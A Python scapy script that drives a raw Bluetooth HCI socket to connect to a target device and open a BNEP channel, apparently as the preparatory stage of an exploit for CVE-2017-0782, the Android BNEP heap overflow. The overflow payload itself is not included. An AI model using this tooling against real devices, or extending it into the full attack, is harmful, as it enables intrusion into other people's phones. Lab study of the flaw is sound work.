#!/usr/bin/env python3
"""Test BNEP connectivity (PSM 0x000F) for CVE-2017-0782."""
import struct, sys, time, os, socket
from scapy.layers.bluetooth import *
from scapy.packet import Raw

TARGET = sys.argv[1] if len(sys.argv) > 1 else '02:00:00:00:00:21'
CID_SIG = 1

def l2cmd(code, ident, data):
    return struct.pack('<BBH', code, ident, len(data)) + data

def bt_recv(bt, timeout_s=0.5):
    bt.ins.settimeout(timeout_s)
    try:
        return bt.recv()
    except (socket.timeout, BlockingIOError, OSError):
        return None

import subprocess
subprocess.run(['systemctl', 'stop', 'bluetooth'], capture_output=True)
subprocess.run(['hciconfig', 'hci0', 'down'], capture_output=True)
time.sleep(0.5)

print('[*] Opening BluetoothUserSocket...')
bt = BluetoothUserSocket(0)

print('[*] HCI Reset...')
bt.send(HCI_Hdr(type=1) / HCI_Command_Hdr(ogf=0x03, ocf=0x0003))
time.sleep(1)
for _ in range(10): bt_recv(bt, 0.3)
bt.send(HCI_Hdr(type=1) / HCI_Command_Hdr(ogf=0x03, ocf=0x001a, len=1) / Raw(b'\x03'))
time.sleep(0.3)
for _ in range(5): bt_recv(bt, 0.3)

print(f'[*] ACL connecting to {TARGET}...')
addr = bytes.fromhex(TARGET.replace(':', ''))[::-1]
params = addr + struct.pack('<HBBHB', 0xCC18, 0x02, 0x00, 0x0000, 0x01)
bt.send(HCI_Hdr(type=1) / HCI_Command_Hdr(ogf=0x01, ocf=0x0005, len=len(params)) / Raw(params))

handle = None
for _ in range(60):
    p = bt_recv(bt, 1.0)
    if p is None: continue
    if HCI_Event_Hdr in p:
        code = p[HCI_Event_Hdr].code
        raw_d = bytes(p[HCI_Event_Hdr].payload)
        if code == 0x03 and len(raw_d) >= 3:
            if raw_d[0] == 0:
                handle = struct.unpack('<H', raw_d[1:3])[0]
                print(f'[+] ACL connected! handle=0x{handle:04x}')
                break
            else:
                print(f'[-] Failed: 0x{raw_d[0]:02x}'); sys.exit(1)

if not handle: print('[-] Timeout'); sys.exit(1)
time.sleep(0.3)

def send_sig(data):
    pkt = HCI_Hdr(type=2) / HCI_ACL_Hdr(handle=handle, PB=0, BC=0) / L2CAP_Hdr(cid=CID_SIG) / Raw(data)
    bt.send(pkt)

def send_data(cid, data):
    pkt = HCI_Hdr(type=2) / HCI_ACL_Hdr(handle=handle, PB=0, BC=0) / L2CAP_Hdr(cid=cid) / Raw(data)
    bt.send(pkt)

# Send CONN_REQ for BNEP (PSM 0x000F)
print('[->] CONN_REQ PSM=0x000F (BNEP)')
send_sig(l2cmd(0x02, 1, struct.pack('<HH', 0x000F, 0x40)))

target_dcid = None
bnep_open = False
nid = 2

for iteration in range(120):
    p = bt_recv(bt, 0.5)
    if p is None: continue
    raw = bytes(p)

    for i in range(len(raw) - 8):
        try:
            ll, lc = struct.unpack('<HH', raw[i:i+4])
            if lc != CID_SIG or ll < 4 or ll > 300 or i + 4 + ll > len(raw):
                continue
            sig = raw[i+4:i+4+ll]
            if len(sig) < 4: continue
            code, ident = sig[0], sig[1]
            slen = struct.unpack('<H', sig[2:4])[0]
            sd = sig[4:4+slen]

            if code == 0x0a and len(sd) >= 2:  # INFO_REQ
                it = struct.unpack('<H', sd[:2])[0]
                print(f'[<-] INFO_REQ type=0x{it:04x}')
                if it == 2:
                    send_sig(l2cmd(0x0b, ident, struct.pack('<HHI', 2, 0, 0xB8)))
                elif it == 3:
                    send_sig(l2cmd(0x0b, ident, struct.pack('<HH', 3, 0) + b'\x02' + b'\x00' * 7))
                else:
                    send_sig(l2cmd(0x0b, ident, struct.pack('<HH', it, 1)))
                print(f'[->] INFO_RSP')
                # Re-send CONN_REQ after info exchange
                if not target_dcid:
                    send_sig(l2cmd(0x02, nid, struct.pack('<HH', 0x000F, 0x40)))
                    nid += 1
                    print(f'[->] CONN_REQ PSM=BNEP (re-sent)')

            elif code == 0x03 and len(sd) >= 8:  # CONN_RSP
                dc, sc, res, st = struct.unpack('<HHHH', sd[:8])
                print(f'[<-] CONN_RSP dcid=0x{dc:04x} scid=0x{sc:04x} result={res} status={st}')
                if res == 0:
                    target_dcid = dc
                    print(f'[+] BNEP L2CAP channel accepted!')
                elif res == 1:
                    print(f'[*] Pending (auth required)...')

            elif code == 0x04 and len(sd) >= 4:  # CONF_REQ
                rd = struct.unpack('<H', sd[:2])[0]
                print(f'[<-] CONF_REQ dcid=0x{rd:04x}')
                # Reply SUCCESS
                send_sig(l2cmd(0x05, ident, struct.pack('<HHH', rd, 0, 0)))
                print(f'[->] CONF_RSP(SUCCESS)')
                # Send our CONF_REQ
                if target_dcid:
                    send_sig(l2cmd(0x04, nid, struct.pack('<HH', target_dcid, 0) + bytes([1, 2, 0x00, 0x02])))
                    nid += 1
                    print(f'[->] CONF_REQ')

            elif code == 0x05 and len(sd) >= 6:  # CONF_RSP
                rs, rf, rr = struct.unpack('<HHH', sd[:6])
                print(f'[<-] CONF_RSP result={rr}')
                if rr == 0 and target_dcid:
                    bnep_open = True
                    print(f'[+] *** BNEP CHANNEL FULLY OPEN! CID=0x{target_dcid:04x} ***')
                    # Send a BNEP Setup Connection Request
                    # BNEP type=0x01 (control), subtype=0x01 (setup conn req)
                    # UUID size: 2 bytes, src UUID: 0x1115 (PANU), dst UUID: 0x1116 (NAP)
                    bnep_setup = bytes([
                        0x01,       # BNEP control type
                        0x01,       # BNEP_SETUP_CONNECTION_REQUEST_MSG
                        0x02,       # UUID size = 2
                        0x11, 0x15, # Source UUID: PANU
                        0x11, 0x16, # Dest UUID: NAP
                    ])
                    send_data(target_dcid, bnep_setup)
                    print(f'[->] BNEP Setup Connection Request (PANU->NAP)')

            elif code == 0x01:  # CMD_REJ
                rsn = struct.unpack('<H', sd[:2])[0] if len(sd) >= 2 else 0
                print(f'[<-] CMD_REJ reason=0x{rsn:04x}')
            else:
                print(f'[<-] L2CAP 0x{code:02x}')
            break
        except Exception:
            continue

    # Also check for BNEP data on the data channel
    if target_dcid:
        for i in range(len(raw) - 8):
            try:
                ll, lc = struct.unpack('<HH', raw[i:i+4])
                if lc == 0x40 and ll > 0:  # Our SCID
                    bnep_data = raw[i+4:i+4+ll]
                    print(f'[<-] BNEP data ({ll} bytes): {bnep_data[:20].hex()}')
                    break
            except:
                continue

    if bnep_open and iteration > 5:
        break

print()
if bnep_open:
    print(f'[+] BNEP channel OPEN on CID 0x{target_dcid:04x}')
    print(f'[+] Ready for CVE-2017-0782 BNEP heap overflow!')
elif target_dcid:
    print(f'[*] L2CAP connected but BNEP config incomplete')
else:
    print(f'[-] Could not establish BNEP channel')

# Disconnect
try:
    bt.send(HCI_Hdr(type=1) / HCI_Command_Hdr(ogf=0x01, ocf=0x0006, len=3) / Raw(struct.pack('<HB', handle, 0x13)))
except: pass
time.sleep(0.3)
bt.close()
print('[*] Done')
